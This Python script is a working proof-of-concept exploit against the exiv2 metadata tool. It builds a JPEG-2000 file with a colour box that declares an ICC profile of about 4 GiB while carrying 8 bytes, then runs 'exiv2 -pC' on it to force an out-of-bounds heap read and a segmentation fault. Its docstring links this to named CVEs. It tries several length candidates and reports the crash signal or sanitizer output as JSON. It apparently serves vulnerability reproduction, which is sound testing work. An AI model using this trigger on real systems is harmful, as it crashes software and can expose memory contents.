#!/usr/bin/env python3
"""PoC driver for the exiv2 command-line metadata tool.

Drives the target through its normal CLI (`exiv2 -pC <file>`, the "print ICC
profile" action) with a JPEG-2000 (JP2) file that is constructed on the fly.

Trigger
-------
A JP2 `jp2h` superbox contains an `ihdr` box and a `colr` box.  The `colr`
box declares a restricted ICC profile (METH=2) whose ICC length field is
0xFFFFFFF0 (~4 GiB) while the box only carries 8 bytes of actual profile
data.  When printing the ICC profile, exiv2 trusts the declared length and
reads far past the end of the file buffer -> out-of-bounds read that walks
off the end of the mapped heap until it hits an unmapped page (SIGSEGV).
This is the class of JP2 colour-box OOB access tracked as CVE-2023-30017 /
CVE-2022-1276.

Why stdout is redirected to /dev/null: the OOB data is streamed to stdout.
If stdout is a pipe or a file, the write path surfaces the bounds failure as
an exiv2 exception ("corrupted image metadata", rc=1) before the read walks
off the heap.  Only when stdout can absorb the output without blocking does
the read run to the unmapped page and fault.  The captured evidence is
therefore the termination signal, not stdout text.

The script is deterministic: the trigger bytes are built in code, written to
a private temporary directory, executed once per candidate with a bounded
timeout, and cleaned up.  No network, no fuzzing, no payload files on disk
before the run.

Output: one JSON object (stdout, and `--json-out` if given).
"""

import argparse
import json
import os
import shutil
import signal
import struct
import subprocess
import sys
import tempfile
import time

# (icc_length, bytes_of_real_profile_data) candidates, tried in order.
# Each is a valid-looking JP2 whose colr box declares an ICC profile far
# larger than the data present.  The first one that kills the process wins;
# if none do, the last run's normal error text is reported instead.
CANDIDATES = [
    (0xFFFFFFF0, 8),   # primary
    (0xFFFFFFFF, 8),
    (0x7FFFFFFF, 8),
]

# Names of signals that indicate abnormal in-process death (i.e. a crash).
# SIGKILL is deliberately excluded: without a timeout it normally means the
# OOM killer, which is resource exhaustion, not a memory-safety fault.
CRASH_SIGNALS = {"SIGSEGV", "SIGBUS", "SIGILL", "SIGABRT", "SIGFPE", "SIGTRAP"}

# Markers a sanitizer build prints into stderr instead of dying by signal.
SANITIZER_MARKERS = (
    "AddressSanitizer", "MemorySanitizer", "ThreadSanitizer",
    "UndefinedBehaviorSanitizer", "runtime error:",
    "heap-buffer-overflow", "stack-buffer-overflow", "heap-use-after-free",
    "stack-overflow", "SEGV on unknown address", "FPE on unknown address",
)

STDERR_LIMIT = 4000
ACTION = "-pC"  # print ICC profile


def build_trigger(icc_length, data_len):
    """Build the JP2 bytes for one trigger candidate."""
    def box(box_type, payload):
        return struct.pack(">I", 8 + len(payload)) + box_type + payload

    # image header: width=1 height=1, 24-bit components, no compression
    ihdr = box(b"ihdr", struct.pack(">II", 1, 1) + bytes([24, 7, 7, 1, 0]))
    # colour specification: METH=2 (restricted ICC), 2 reserved bytes,
    # then the (lying) 32-bit ICC profile length and a sliver of data.
    colr = box(
        b"colr",
        bytes([2, 0, 0]) + struct.pack(">I", icc_length) + b"A" * data_len,
    )
    jp2h = box(b"jp2h", ihdr + colr)
    # minimal container: signature, ftyp, header superbox, codestream stub
    return (
        box(b"jP  ", b"\x0d\x0a\x87\x0a")
        + box(b"ftyp", b"jp2 " + struct.pack(">I", 0) + b"jp2 ")
        + jp2h
        + box(b"jp2c", b"\xff\x4f\xff\xd9")
    )


def signal_name(rc):
    """Return the signal name for a negative subprocess returncode."""
    if rc is None or rc >= 0:
        return None
    try:
        return signal.Signals(-rc).name
    except ValueError:
        return "SIG%d" % -rc


def truncate(text, limit=STDERR_LIMIT):
    text = text or ""
    if len(text) <= limit:
        return text
    return text[:limit] + "...[truncated]"


def find_sanitizer_marker(stderr_text):
    for marker in SANITIZER_MARKERS:
        idx = stderr_text.find(marker)
        if idx != -1:
            line_start = stderr_text.rfind("\n", 0, idx) + 1
            line_end = stderr_text.find("\n", idx)
            if line_end == -1:
                line_end = len(stderr_text)
            line = stderr_text[line_start:line_end].strip()
            return line[:200] or marker
    return None


def run_target(binary, argv, timeout):
    """Run one invocation with a bounded wall-clock budget.

    Returns (returncode, stderr_text, timed_out, runtime_ms).
    """
    start = time.monotonic()
    proc = subprocess.Popen(
        argv,
        # DEVNULL is essential: a pipe/file sink makes exiv2 raise
        # "corrupted image metadata" before the OOB read faults.
        stdout=subprocess.DEVNULL,
        stderr=subprocess.PIPE,
    )
    timed_out = False
    try:
        _, stderr_bytes = proc.communicate(timeout=timeout)
    except subprocess.TimeoutExpired:
        timed_out = True
        proc.kill()
        _, stderr_bytes = proc.communicate()
    runtime_ms = int((time.monotonic() - start) * 1000)
    return (
        proc.returncode,
        (stderr_bytes or b"").decode("utf-8", "replace"),
        timed_out,
        runtime_ms,
    )


def main():
    parser = argparse.ArgumentParser(
        description="Drive exiv2's -pC action with a crafted JP2 file."
    )
    parser.add_argument("--binary", required=True, help="path to the exiv2 binary")
    parser.add_argument("--json-out", default=None, help="also write the JSON here")
    parser.add_argument(
        "--timeout",
        type=float,
        default=30.0,
        help="per-invocation wall-clock budget in seconds (default 30)",
    )
    args = parser.parse_args()

    result = {
        "binary": args.binary,
        "command": None,
        "returncode": None,
        "signal": None,
        "timed_out": False,
        "runtime_ms": 0,
        "stdout": "",
        "stderr": "",
        "observable": {"kind": "custom", "value": "not run", "path": None},
        "error": None,
    }

    tmpdir = None
    try:
        if not args.binary or not os.path.isfile(args.binary):
            result["error"] = "binary not found: %r" % args.binary
            return emit(result, args.json_out)

        tmpdir = tempfile.mkdtemp(prefix="exiv2_poc_")
        trigger_path = os.path.join(tmpdir, "trigger.jp2")

        last = None  # (argv, rc, stderr, timed_out, runtime_ms)
        for icc_length, data_len in CANDIDATES:
            with open(trigger_path, "wb") as fh:
                fh.write(build_trigger(icc_length, data_len))
            argv = [args.binary, ACTION, trigger_path]
            rc, stderr_text, timed_out, runtime_ms = run_target(
                args.binary, argv, args.timeout
            )
            last = (argv, rc, stderr_text, timed_out, runtime_ms)

            sig = signal_name(rc)
            if timed_out:
                # Hangs are not memory-safety evidence; report and stop.
                break
            if rc is not None and rc < 0 and sig in CRASH_SIGNALS:
                break
            # keep probing otherwise; a fixed build exits normally (rc=1)
            # with "corrupted image metadata" for every candidate.

        argv, rc, stderr_text, timed_out, runtime_ms = last
        sig = signal_name(rc)

        result["command"] = argv
        result["returncode"] = rc
        result["signal"] = sig
        result["timed_out"] = timed_out
        result["runtime_ms"] = runtime_ms
        result["stderr"] = truncate(stderr_text)

        if timed_out:
            result["observable"] = {
                "kind": "custom",
                "value": "timeout: target exceeded %.0fs budget" % args.timeout,
                "path": None,
            }
        elif rc is not None and rc < 0 and sig in CRASH_SIGNALS:
            result["observable"] = {
                "kind": "crash_trace",
                "value": sig,
                "path": None,
            }
        elif rc is not None and rc < 0:
            # e.g. SIGKILL from the OOM killer: death, but not our flaw.
            result["observable"] = {
                "kind": "custom",
                "value": "terminated by %s without a memory-safety signal" % sig,
                "path": None,
            }
        else:
            marker = find_sanitizer_marker(stderr_text)
            if marker:
                result["observable"] = {
                    "kind": "crash_trace",
                    "value": marker,
                    "path": None,
                }
            else:
                lines = [
                    ln.strip()
                    for ln in stderr_text.splitlines()
                    if ln.strip()
                ]
                result["observable"] = {
                    "kind": "stderr",
                    "value": lines[-1][:200] if lines else "no diagnostic output",
                    "path": None,
                }

    except Exception as exc:  # internal script failure, not target behaviour
        result["error"] = "%s: %s" % (type(exc).__name__, exc)
    finally:
        if tmpdir:
            shutil.rmtree(tmpdir, ignore_errors=True)

    return emit(result, args.json_out)


def emit(result, json_out_path):
    payload = json.dumps(result, indent=2)
    print(payload)
    if json_out_path:
        out_dir = os.path.dirname(os.path.abspath(json_out_path))
        if out_dir and not os.path.isdir(out_dir):
            os.makedirs(out_dir, exist_ok=True)
        with open(json_out_path, "w", encoding="utf-8") as fh:
            fh.write(payload + "\n")
    return 0 if result["error"] is None else 2


if __name__ == "__main__":
    sys.exit(main())
